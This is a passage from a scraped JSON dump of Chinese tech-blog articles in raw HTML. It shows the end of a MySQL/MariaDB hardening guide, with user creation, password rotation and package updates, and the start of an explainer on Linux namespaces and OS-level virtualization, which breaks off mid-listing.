网站，如下创建一个 wordpress 的数据库用户：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957f1307642437\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -p\r\nMariaDB [(none)]&gt; CREATE DATABASE osclass_db;\r\nMariaDB [(none)]&gt; CREATE USER 'osclassdmin'@'localhost' IDENTIFIED BY 'osclass@dmin%!2';\r\nMariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON osclass_db.* TO 'osclassdmin'@'localhost';\r\nMariaDB [(none)]&gt; FLUSH PRIVILEGES;\r\nMariaDB [(none)]&gt; exit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957f1307642437-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957f1307642437-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957f1307642437-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957f1307642437-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957f1307642437-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957f1307642437-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957f1307642437-1\"><span class=\"crayon-p\"># mysql -u root -p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957f1307642437-2\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">DATABASE</span> <span class=\"crayon-v\">osclass_db</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39a3957f1307642437-3\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">USER</span> <span class=\"crayon-s\">'osclassdmin'</span><span class=\"crayon-sy\">@</span><span class=\"crayon-s\">'localhost'</span> <span class=\"crayon-i\">IDENTIFIED</span> <span class=\"crayon-i\">BY</span> <span class=\"crayon-s\">'osclass@dmin%!2'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957f1307642437-4\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">GRANT</span> <span class=\"crayon-i\">ALL</span> <span class=\"crayon-i\">PRIVILEGES</span> <span class=\"crayon-i\">ON</span> <span class=\"crayon-v\">osclass_db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span> <span class=\"crayon-st\">TO</span> <span class=\"crayon-s\">'osclassdmin'</span><span class=\"crayon-sy\">@</span><span class=\"crayon-s\">'localhost'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39a3957f1307642437-5\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">FLUSH</span> <span class=\"crayon-v\">PRIVILEGES</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957f1307642437-6\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-v\">exit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>并且要记住对于不再使用的数据库用户要删掉。</p>\n<h1>10. 使用额外的安全插件和库</h1>\n<p>MySQL 包含许多安全插件：验证客户端连接到 MySQL 服务器的请求、密码校验和敏感信息的安全存储等，这些都在免费版本中提供。</p>\n<p>在这里可查看更多：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/security-plugins.html\" target=\"_blank\" rel=\"nofollow\">https://dev.mysql.com/doc/refman/5.7/en/security-plugins.html</a></p>\n<h1>11. 定期修改 MySQL 密码</h1>\n<p>定期修改密码是一个常见的信息/应用/系统安全建议。多久修改一次密码由你内部的安全策略决定。定期修改密码可以阻止长期跟踪你的“窥探者”，获取你的密码，登录你的 MySQL 服务器。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957f5017245097\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nMariaDB [(none)]&gt; USE mysql;MariaDB [(none)]&gt; UPDATE user SET password=PASSWORD('YourPasswordHere') WHERE User='root' AND Host = 'localhost';MariaDB [(none)]&gt; FLUSH PRIVILEGES;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957f5017245097-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957f5017245097-1\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-st\">USE</span> <span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">;</span><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">UPDATE</span> <span class=\"crayon-i\">user</span> <span class=\"crayon-i\">SET</span> <span class=\"crayon-v\">password</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">PASSWORD</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'YourPasswordHere'</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-v\">User</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'root'</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-i\">Host</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'localhost'</span><span class=\"crayon-sy\">;</span><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">FLUSH</span> <span class=\"crayon-v\">PRIVILEGES</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h1>12. 定期更新 MySQL Server 包</h1>\n<p>强烈建议定期从官方仓库更新 mysql/mariadb 包来获取最新的安全更新和错误改进。通常情况下操作系统中默认的包是过时的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957f9886131400\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# yum update\r\n# apt update</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957f9886131400-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957f9886131400-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957f9886131400-1\"><span class=\"crayon-p\"># yum update</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957f9886131400-2\"><span class=\"crayon-p\"># apt update</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在对 mysql/mariadb server 进行任何修改之后，要重启服务。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957fc334223009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# systemctl restart mariadb\t\t#RHEL/CentOS\r\n# systemctl restart mysql\t\t#Debian/Ubuntu</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957fc334223009-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957fc334223009-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957fc334223009-1\"><span class=\"crayon-p\"># systemctl restart mariadb\t\t#RHEL/CentOS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957fc334223009-2\"><span class=\"crayon-p\"># systemctl restart mysql\t\t#Debian/Ubuntu</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>分享到此结束，欢迎大家在文章下面评论，并且和我们分享文章中没有提到的安全提示。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113422\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113422votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113422\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "操作系统级虚拟化概述", "fav_nums": 1, "url": "http://blog.jobbole.com/113459/", "create_date": "2018/01/09", "url_object_id": "f9947ec196965902f6858b2ff93b9565", "comment_nums": 0, "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/kelvinxupt/blog/1602990\">宅蓝三木</a>   </div><h1>操作系统级虚拟化</h1>\n<div>\n<p>KVM、XEN等虚拟化技术允许各个虚拟机拥有自己独立的操作系统。与KVM、XEN等虚拟化技术不同，所谓操作系统级虚拟化，也被称作容器化，是操作系统自身的一个特性，它允许多个相互隔离的用户空间实例的存在。这些用户空间实例也被称作为容器。普通的进程可以看到计算机的所有资源而容器中的进程只能看到分配给该容器的资源。通俗来讲，操作系统级虚拟化将操作系统所管理的计算机资源，包括进程、文件、设备、网络等分组，然后交给不同的容器使用。容器中运行的进程只能看到分配给该容器的资源。从而达到隔离与虚拟化的目的。</p>\n<p>实现操作系统虚拟化需要用到Namespace及cgroups技术。</p>\n<h1>命名空间(Namespace)</h1>\n<p>在编程语言中，引入命名空间的概念是为了重用变量名或者服务例程名。在不同的命名空间中使用同一个变量名而不会产生冲突。Linux系统引入命名空间也有类似的作用。例如，在没有操作系统级虚拟化的Linux系统中，用户态进程从1开始编号(PID)。引入操作系统虚拟化之后，不同容器有着不同的PID命名空间，每个容器中的进程都可以从1开始编号而不产生冲突。</p>\n<p>目前，Linux中的命名空间有6种类型，分别对应操作系统管理的6种资源：</p>\n<ul>\n<li>挂载点(mount point) CLONE_NEWNS</li>\n<li>进程(pid) CLONE_NEWPID</li>\n<li>网络(net) CLONE_NEWNET</li>\n<li>进程间通信(ipc) CLONE_NEWIPC</li>\n<li>主机名(uts) CLONE_NEWUTS</li>\n<li>用户(uid) CLONW_NEWUSER</li>\n</ul>\n<p>将来还会引入时间、设备等对应的namespace.</p>\n<p>Linux 2.4.19版本引入了第一个命名空间——挂载点，因为那时还没有其他类型的命名空间，所以clone系统调用中引入的flag就叫做CLONE_NEWNS</p>\n<h2>与命名空间相关的三个系统调用(system calls)</h2>\n<p>下面3个系统调用用来操作命名空间：</p>\n<ul>\n<li>clone() —— 用来创建新的进程及新的命名空间，新的进程会被放到新的命名空间中</li>\n<li>unshare() —— 创建新的命名空间但并不创建新的子进程，之后创建的子进程会被放到新创建的命名空间中去</li>\n<li>setns() —— 将进程加入到已经存在的命名空间中</li>\n</ul>\n<p>注意：这３个系统调用都不会改变调用进程(calling process)的pid命名空间，而是会影响其子进程的pid命名空间</p>\n<p>命名空间本身并没用名字(囧)，不同的命名空间用不同的inode号来标识，这也符合Linux用文件一统天下的惯例。可以在proc文件系统中查看一个进程所属的命名空间，例如，查看PID为4123的进程所属的命名空间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e20764303085\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkelvin@desktop:~$ ls -l /proc/4123/ns/\r\n总用量 0\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 cgroup -&gt; cgroup:[4026531835]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 ipc -&gt; ipc:[4026531839]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 mnt -&gt; mnt:[4026531840]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 net -&gt; net:[4026531963]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 pid -&gt; pid:[4026531836]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 user -&gt; user:[4026531837]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 uts -&gt; uts:[4026531838]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e20764303085-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e20764303085-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e20764303085-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e20764303085-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e20764303085-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e20764303085-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e20764303085-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e20764303085-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e20764303085-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e20764303085-1\"><span class=\"crayon-v\">kelvin</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">desktop</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4123</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ns</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e20764303085-2\">总用量<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e20764303085-3\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531835</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e20764303085-4\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipc</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531839</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e20764303085-5\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span 